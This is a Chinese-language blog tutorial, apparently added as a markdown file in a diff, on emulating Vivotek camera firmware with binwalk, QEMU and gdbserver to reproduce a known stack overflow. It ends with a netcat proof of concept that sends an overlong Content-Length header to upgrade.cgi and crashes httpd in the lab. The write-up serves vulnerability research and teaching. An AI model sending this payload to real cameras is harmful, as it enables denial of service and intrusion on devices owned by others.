@@ -1,0 +1,282 @@
+---
+title: "vivotek摄像头栈溢出漏洞复现(一)"
+date: "2021-01-18"
+tags: ['qemu环境搭建', '固件分析入门']
+draft: false
+summary: "简介： 本文将以vivotek历史固件为例详细地描述IoT固件分析的流程，其中主要包括如何获取的固件、binwalk的安装、固件文件系统的寻找、qemu虚拟机的搭建、固件的模拟运行。这些步骤是进行IoT漏洞挖掘和分析的必要准备。"
+---
+
+简介：
+本文将以vivotek历史固件为例详细地描述IoT固件分析的流程，其中主要包括如何获取的固件、binwalk的安装、固件文件系统的寻找、qemu虚拟机的搭建、固件的模拟运行。这些步骤是进行IoT漏洞挖掘和分析的必要准备。
+
+
+# 写在前面
+要对IoT固件进行分析，首先需要清晰的了解我们要分析的对象是什么、工具是什么、方法是什么。
+
+首先我们要分析的对象是**IoT固件**如路由器、摄像头固件。目前我的理解是固件就是写入硬件设备的嵌入式操作系统，是最基础最底层的程序，但有时也会包括硬件设备需要完成的功能。我们可以获取的固件的一般存在形式是经过交叉编译之后的二进制文件，然后再经过各种打包成pkg、zip等格式的文件。
+
+分析的**工具**上包括binwalk和qemu、gdbwerver等。我们的目标是在我们的笔记本上模拟固件在一块板子上的执行情况，然后分析其中的漏洞。binwalk是一款快速、易用，用于分析，逆向工程和提取固件映像的工具，我们通过它可以完成从固件上提取根文件系统的任务。QEMU是一种通用的硬件仿真虚拟机，可以在x86架构下的笔记本上经过QEMU的转换运行ARM、MIPS架构的指令。我们就是通过QEMU模拟固件在硬件设备上运行的情况。gdbserver用于QEMU模拟运行时的远程调试。
+
+友情建议：**请注意左侧提供的文章目录**
+
+重要参考链接：
++ 漏洞复现和利用：https://www.anquanke.com/post/id/185336
++ 漏洞复现和利用：https://paper.seebug.org/480/
++ 漏洞复现和利用：https://xz.aliyun.com/t/5054#toc-3
++ gdb_gdbserver远程调试：https://blog.csdn.net/zhaoxd200808501/article/details/77838933
+
+
+# 主要内容
+
+## 获取带有漏洞的历史固件
+知道创宇在 https://paper.seebug.org/649/ 中提到了摄像头固件的获取思路，无非就是从官网或者网络渠道下载、通过串口获取、或者直接读取固件存储芯片。由于作者刚刚接触IoT固件，所以肯定先跳过获取固件的这个部分，选择了从网络上直接下载。
+
+以下我找到的在github上分享的vivotok摄像头的历史固件，可以下载下来直接分析：[固件获取地址](https://github.com/mcw0/PoC/files/3128058/CC8160-VVTK-0100d.flash.zip)
+
+
+## 安装binwalk & 提取固件中的操作系统
+binwalk是由python编写的自动化固件逆向工具，换句话说，通过binwalk我们可以从二进制的固件中扫描出嵌入式文件类型、提取出来其中的文件系统、搜索特定二进制串等。具体来说，它被设计用于识别嵌入固件镜像内的文件和代码。 Binwalk使用libmagic库，因此它与Unix文件实用程序创建的magic数字签名兼容。 Binwalk还包括一个自定义magic魔术签名文件，其中包含常见的诸如压缩/存档文件，固件头，Linux内核，引导加载程序，文件系统等的固件映像中常见文件的改进magic数字签名。
+
+<mark>**补充:**</mark> 魔术数字也会在文件中使用，用于识别一个文件格式或协议类型的一段常量或字符串，例如UNIX的特征签名。在特定文件格式中加入固定数值和固定字符串，然后便可以通过检查文件是否包含这些数据来快速地识别文件格式。例如：GIF文件开头会包含GIF89a（47 49 46 38 39 61）或GIF87a（47 49 46 38 37 61）这两种字符串。
+
+首先是安装binwalk，在ubuntu18.04下直接通过apt安装即可。
+```
+sudo apt-get install binwalk
+```
+
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/binwalk_install.png")
+
+接下来是使用安装好的binwalk来对其进行解压。使用的命令如下:
+```
+binwalk -eM 'CC8160-VVTK-0100d.flash.zip
+```
+
+其中`-e`和`--extract`按照预定义的配置文件中的提取方法从固件中提取到的文件及系统
+其中`-M`和`--matryoshka`根据magic签名扫描结果进行递归提取
+
+经过提取之后文件如下图所示：
+
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/dir-L1.png")
+
+
+可以看到这是根据偏移量递归提取的文件，如果使用tree命令进行展开的话可以从中找到我们需要的源文件，但比较麻烦，我们希望直接知道其中的根文件系统squashfs-root。
+```
+find . -name squashfs-root
+```
+
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/squashfs-root.png")
+
+## qemu安装
+
+首先对于QEMU的理解，有两点是最基本的：一是它可以通过**机器代码**的实时转换来模拟其他处理器以用于虚拟机运行不同的操作系统，二是QEMU包含qemu-system和qemu-user两种模式，前者是指通过QEMU将Linux的程序（X86）编译成其他CPU（ARM、MIPS）支持的程序。系统模式下QEMU会完整的模拟一整个计算机系统，包括外围设备.要使用系统模式, 则还需要准备好内核文件和系统磁盘映像。至于QEMU的组成、架构可以参考[这篇博客](https://cloud.tencent.com/developer/article/1521505)进行更深入的了解：
+
+QEMU在Ubuntu上的安装通过apt-get即可，不需要进行源码下载然后自己编译。
+```
+sudo apt-get install qemu
+```
+
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/qemu_install.png")
+此外，安装qemu-static-arm工具。
+```
+sudo apt-get install qemu-arm-static``
+```
+
+输入以下命令然后按tab键查看qemu此时提供的命令，如下图所示。注意如果找不到qemu-system-arm，可以尝试`qemu-system-`再按tab查看。
+```
+qemu-
+```
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/qemu-.png")
+注意其中同样是arm框架，包含了三种命令：qemu-arm, qemu-system-arm, qemu-arm-static.下面对这三种模式进行解读：
++ qemu-arm: 此模式是指之前的**用户模式**，或者更准确地说是系统调用模拟。我们可以将linux下交叉编译好的可执行程序比如helloworld用qemu-arm去跑。
++ qemu-system-arm: 此模式是指之前的**系统模式**，会模拟出整个设备（板子）和其中跑的操作系统。所以同样是跑helloworld程序，就需要将该程序的二进制文件加载到虚拟磁盘上，然后通过其上运行的操作系统去跑。
++ qemu-arm-static: **准确来讲，这是qemu提供的工具，并不存在任何层次上的虚拟化**，只是将ARM机器上的指令**翻译**成宿主CPU可运行的指令。
+
+此外，在Vivotek摄像头固件漏洞挖掘-AFL实战（二）对于qemu-arm模式有更深入的解读。
+
+## qemu-arm-static静态启动摄像头的http服务
+
+我们可以根据摄像头的漏洞详情，发现是通过远程get或者post触发的栈溢出，所以首先需要开启摄像头的httpd服务。这里使用的是qemu-arm-static工具。
+
+首先使用cp命令将qemu-arm-static复制到摄像头的根文件目录。遇到报错不用纠结，ls一下发现已经复制过来了。
+```
+sudo cp $(whereis qemu-arm-static) .
+```
+
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/cp_qemu_arm_static.png")
+
+使用mount命令挂在/dev和/proc目录.注意最好首先sudo su切换到root用户下避免sudo命令，其次是cd到squashfs-root目录下
+```
+mount -o bind /dev ./dev
+mount -t proc /proc ./proc
+```
+
+然后使用chroot命令更改文件根目录为当前摄像头文件系统的根目录，使用qemu-arm-static执行httpd程序。
+```
+sudo chroot . ./qemu-arm-static ./usr/sbin/httpd
+```
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/3-2.png")
+
+注意chroot命令的理解，三个参数分别是**被当成root根目录的目录位置**、**qemu是在此目录的基础上的相对位置**、**开源组件（所要运行的程序）也是在此目录的基础上的相对位置**三者缺一都会报错。
+
+执行后发现会报 Could not open boa.conf for reading这个错误，根据[这篇博客](https://www.anquanke.com/post/id/185336)中给出的解决方案需要在binwalk的解压的文件中搜索boa.conf文件，然后把该etc目录复制到../mnt/flash目录下面。具体操作如下所示。
+```
+find . -name boa.conf
+```
+
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/3-3.png")
+
+cd到上图中画横线的etc路径，然后进行复制替换原来根文件系统下的/mnt/flash/etc路径。
+```
+cp -r ./etc /home/apple/Desktop/_CC8160-VVTK-0100d.flash.zip.extracted/_CC8160-VVTK-0100d.flash.pkg.extracted/_31.extracted/_rootfs.img.extracted/squashfs-root/mnt/flash
+```
+
+重新挂载、运行可以发现原来的报错已经成功debug了。
+
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/3-4.png")
+
+但是出现了新的bug: gethostbyname:: Success，这个问题是qemu虚拟机和固件的系统的host name不一样，导致无法获取。解决方案就是将Linux操作系统的hostname改为./etc/hosts的主机名即可。其中需要注意的是，修改Linux操作系统的hostname需要使用echo命令如下所示:
+```
+echo "127.0.0.1 Network-Camera localhost" >   /proc/sys/kernel/hostname
+```
+
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/3-5.png")
+
+重新使用qemu-arm-static运行，发现boa简易webserver已经成功提供http服务。
+
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/3-6.png")
+
+## 使用qemu-system系统模式模拟
+
+首先使用qemu的系统模式需要首先下载安装到板子上的操作系统，这里可以参考[这篇博客](http://m.blog.chinaunix.net/uid-26772897-id-3183702.html)去安装qemu镜像。
+```
+mkdir & cd arm-debian
+wget http://people.debian.org/~aurel32/qemu/armel/debian_squeeze_armel_standard.qcow2
+wget http://people.debian.org/~aurel32/qemu/armel/initrd.img-2.6.32-5-versatile
+wget http://people.debian.org/~aurel32/qemu/armel/vmlinuz-2.6.32-5-versatile
+```
+
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/4-1.png")
+
+然后设置qemu虚拟机接入linux虚拟机的方式，这里采用桥接的方式。
+```
+sudo tunctl -t tap0 -u `whoami` 
+sudo ifconfig tap0 192.168.2.1/24
+```
+
+
+启动qemu虚拟机。其中用户和密码可以参考下面的[Readme.md](https://people.debian.org/~aurel32/qemu/armel/)
+```
+qemu-system-arm -M versatilepb -kernel vmlinuz-3.2.0-4-versatile -initrd initrd.img-3.2.0-4-versatile -hda debian_wheezy_armel_standard.qcow2 -append "root=/dev/sda1"  -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic
+```
+
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/4-2.png")
+
+在启动虚拟机后，对固件的文件系统进行挂载。首先需要将根文件系统传到qemu虚拟机的debian的操作系统上然后进行挂载。
+
+qemu和虚拟机之间的文件传输可以通过ftp来进行。首先在qemu上配置网卡eth0。
+```
+ifconfig eth0 192.168.2.2/24
+```
+
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/4-3.png")
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/4-4.png")
+在qemu上使用ftp远程登陆ubuntu。
+```
+ftp 192.168.2.1
+```
+
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/4-5.png")
+
+在ubuntu上打包squashfs-root目录为tar,然后在qemu虚拟机上使用get命令下载。
+
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/4-6.png")
+
+使用tar命令进行解压。
+```
+tar xvf squashfs-root.tar
+```
+
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/4-7.png")
+
+此时即可使用以下命令挂载固件的根文件系统。
+```
+mount -o bind /dev ./squashfs-root/dev
+mount -t proc /proc/ ./squashfs-root/proc/
+```
+
+切换到固件的根文件系统作为根系统，执行新目录结构下的shell。
+```
+chroot squashfs-root sh
+```
+
+修改hostname之后启动httpd服务。
+```
+./usr/sbin/httpd
+```
+
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/4-8.png")
+
+
+## dbg+dbgserver远程调试
+
+在原来的基础上通过dbg+dbgserver远程调试程序的执行。在本地通过arm-none-eabi-gdb的target remote连接qemu虚拟机，在qemu的虚拟机上启动dbgserver。qemu上运行的gdbserver需要交叉编译为arm架构下的指令，所以可以采用已经静态编译好的gdbserver-7.7.1-armel-eabi5-vi-sysv.[下载链接](https://github.com/lucyoa/embedded-tools/blob/master/gdbserver/gdbserver-7.7.1-armel-eabi5-v1-sysv)在这里。
+
+linux本地的gdb的安装可以参考此链接下的[指南](https://acassis.wordpress.com/2018/12/27/adding-arm-none-eabi-gdb-to-ubuntu-18-04/)首先需要手动到官网上去下载安装包，然后本地进行安装。
+
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/5-1.png")
+
+qemu上gdbserver需要将下载好的gdbserver-7.7.1-armel-eabi5-vi-sysv通过ftp传到qemu虚拟机中的squashfs-root目录中，与传squashfs-root的方法相同。
+
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/5-2.png")
+
+编写用于调试的shell脚本，如下所示。将通过端口1234来远程连接到gdbserver进行调试。
+```
+#!/bin/sh
+pid=`ps | grep -v grep | grep httpd | awk '{print $1}'`
+if [ ! $pid ]
+then 
+/usr/sbin/httpd
+fi
+./gdbserver-7.7.1-armel-eabi5-v1-sysv --attach 127.0.0.1:1234 `ps | grep -v grep | grep httpd | awk '{print $1}'`
+```
+
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/5-3.png")
+
+运行该脚本。注意如果直接运行脚本会报错Permission denied，可以使用chmod命令赋予执行权限。
+```
+chmod 777 start_debug.sh
+```
+
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/5-4.png")
+
+在本地开启arm-none-eabi-gdb，输入以下命令连接到gdbserver。
+```
+target remote 192.168.2.2:1234
+```
+
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/5-5.png")
+
+
+## 栈溢出漏洞POC
+
+下面是漏洞完整的POC演示。
+首先在qemu的虚拟机上开启httpd服务并且开启gdbserver远程调试的debug端口。
+
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/6-1.png")
+
+宿主机上连接该端口。
+
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/6-2.png")
+
+通过宿主机向qemu虚拟机发送漏洞的POC，其中提供的POC如下所示。
+```
+echo -en "POST /cgi-bin/admin/upgrade.cgi HTTP/1.0\nContent-Length:AAAAAAAAAAAAAAAAAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIXXXX\n\r\n\r\n"  | netcat -v 192.168.2.2 80
+```
+
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/6-3.png")
+在宿主机上输入continue，继续程序运行如下所示，发现调试程序崩溃，发生了段错误！
+
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/6-4.png")
+在qemu的虚拟机上发现httpd服务报错退出。
+
+![]("/static/images/IoT固件分析-vivotok摄像头栈溢出漏洞/6-5.png")
